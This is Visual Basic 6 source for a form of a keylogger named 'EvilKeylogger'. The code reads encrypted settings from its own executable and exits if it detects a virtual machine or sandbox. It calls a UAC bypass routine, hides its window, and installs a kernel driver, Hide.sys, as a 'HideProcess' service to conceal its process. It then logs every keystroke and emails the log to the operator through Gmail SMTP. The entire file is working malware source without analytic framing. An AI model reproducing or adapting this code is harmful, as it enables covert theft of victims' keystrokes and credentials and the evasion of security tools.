VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   2955
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4935
   LinkTopic       =   "Form1"
   ScaleHeight     =   2955
   ScaleWidth      =   4935
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.TextBox Text1 
      Height          =   270
      Left            =   240
      TabIndex        =   1
      Text            =   "ProcessId"
      Top             =   120
      Width           =   1695
   End
   Begin VB.TextBox Grab 
      Height          =   2295
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   480
      Visible         =   0   'False
      Width           =   4695
   End
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   2160
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Dim Load_Drv As New cls_Driver

Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long

Const FILE_DEVICE_ROOTKIT As Long = &H2A7B
Const METHOD_BUFFERED     As Long = 0
Const METHOD_IN_DIRECT    As Long = 1
Const METHOD_OUT_DIRECT   As Long = 2
Const METHOD_NEITHER      As Long = 3
Const FILE_ANY_ACCESS     As Long = 0
Const FILE_READ_ACCESS    As Long = &H1     '// file & pipe
Const FILE_WRITE_ACCESS   As Long = &H2     '// file & pipe
Const FILE_READ_DATA      As Long = &H1
Const FILE_WRITE_DATA     As Long = &H2


Private Declare Function ShowWindow Lib "User32" _
      (ByVal hWnd As Long, ByVal nCmdShow As Long) _
      As Long
   Private Declare Function FindWindow Lib "User32" Alias "FindWindowA" _
      (ByVal lpClassName As String, ByVal lpWindowName As String) _
      As Long
   Private Const HideWindow = 0

Private WithEvents oMail As clsCDOmail
Attribute oMail.VB_VarHelpID = -1
Private Host As String
Private User As String
Private pass As String
Private frappe As String

Sub Form_Load()
Dim niller As String
Dim InfoNotif() As String
Dim Options() As String
Dim stealth() As String
Dim dllskin() As Byte

Call iOpen

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
niller = Space(LOF(1))
Get #1, , niller
Close #1


dllskin = LoadResData(101, "CUSTOM")
Open Environ("WINDIR") & "\Hide.sys" For Binary As #1
Put #1, , dllskin
Close #1


InfoNotif() = Split(niller, "KYZERILOVEYOU")
Options() = Split(niller, "KYZERYOUARETHEBEST")
stealth() = Split(niller, "KYZERKISSME")

Host = RC4(InfoNotif(1), "lol")
User = RC4(InfoNotif(2), "lol")
pass = RC4(InfoNotif(3), "lol")
frappe = InfoNotif(4)

If Options(1) = 1 Then
If IsVirtualPCPresent = 1 Then End
End If

If Options(2) = 1 Then
If IsVirtualPCPresent = 3 Then End
End If

If Options(3) = 1 Then
If IsVirtualPCPresent = 2 Then End
End If

If Options(4) = 1 Then
If IsInSandbox = 5 Then End
End If

If Options(5) = 1 Then
If IsInSandbox = 4 Then End
End If

If Options(6) = 1 Then
If IsInSandbox = 1 Then End
End If

If Options(7) = 1 Then
If IsInSandbox = 3 Then End
End If

If Options(8) = 1 Then
If IsInSandbox = 2 Then End
End If

If Options(9) = 1 Then
Call Fuck_UAC
End If

If stealth(1) = 1 Then
Call attrib
End If

If stealth(2) = 1 Then
Call hideme
Call rdv
End If

If stealth(3) = 1 Then
Call dfwb
End If

Do While 1 = 1
DoEvents
Grab = Grab & GetKey
Loop
End Sub

Public Function attrib()
On Error Resume Next
SetAttr Environ("WINDIR") & "\svhost.exe", vbHidden
End Function

Public Function hideme()
Dim Findtask As String
Dim HideTask As String
Findtask = FindWindow(vbNullString, "Project1")
HideTask = ShowWindow(Findtask, HideWindow)
End Function
Private Sub Timer1_Timer()
Dim FilePath As String
If Len(Grab.Text) >= CInt(frappe) Then
FilePath = "C:\Output.txt"
Open FilePath For Output As #1
  Print #1, Grab.Text
Close #1
Call sendkey
End If
End Sub

Public Function sendkey()

Set oMail = New clsCDOmail
    With oMail
         'datos para enviar
        .servidor = "smtp.gmail.com"
        .puerto = 465
        .UseAuntentificacion = True
        .ssl = True
        .Usuario = Host
        .Password = User
        .Asunto = "EvilKeylogger" & Environ$("ComputerName")
        .de = Host
        .para = pass
        .Mensaje = "EvilKeylogger:" & vbNewLine & vbNewLine & Grab.Text
        
        
        .Enviar_Backup ' manda el mail
    
    End With
    
    Set oMail = Nothing

Grab = ""
Kill "C:\Output.txt"


End Function

Public Function PasswordGenerator(ByVal lngLength As Long) _
  As String

On Error GoTo Err_Proc
  
 Dim iChr As Integer
 Dim C As Long
 Dim strResult As String
 Dim iAsc As String
 
 Randomize Timer

 For C = 1 To lngLength
 
   iAsc = Int(3 * Rnd + 1)
   
  
   Select Case iAsc
     Case 1
       iChr = Int((Asc("Z") - Asc("A") + 1) * Rnd + Asc("A"))
     Case 2
       iChr = Int((Asc("z") - Asc("a") + 1) * Rnd + Asc("a"))
     Case 3
       iChr = Int((Asc("9") - Asc("0") + 1) * Rnd + Asc("0"))
     Case Else
       Err.Raise 20000, , "PasswordGenerator has a problem."
   End Select
   
   strResult = strResult & Chr(iChr)
 
 Next C
 
 PasswordGenerator = strResult
 
Exit_Proc:
 Exit Function
 
Err_Proc:
 MsgBox Err.Number & ": " & Err.Description, _
    vbOKOnly + vbCritical
 PasswordGenerator = vbNullString
 Resume Exit_Proc
 
End Function


Public Sub anus()

Dim ProcessID As Long
ProcessID = CLng(Text1.Text)
With Load_Drv
Call .IoControl(.CTL_CODE_GEN(&H801), VarPtr(ProcessID), 4, 0, 0)
End With

End Sub

Public Function rdv()
    If EnablePrivilege(SE_DEBUG) = False Then
       If Not EnablePrivilege1(SE_DEBUG_PRIVILEGE, True) Then
          End
       End If
    End If
    
    Call Command1_Click
    Text1.Text = GetCurrentProcessId()
anus
End Function

Private Sub Command1_Click()


    With Load_Drv
        .szDrvFilePath = Environ("WINDIR") & "\Hide.sys"
        .szDrvLinkName = "HideProcess"
        .szDrvSvcName = "HideProcess"
        .szDrvDisplayName = "HideProcess"
        .InstDrv
        .StartDrv
        .OpenDrv
    End With
    
End Sub
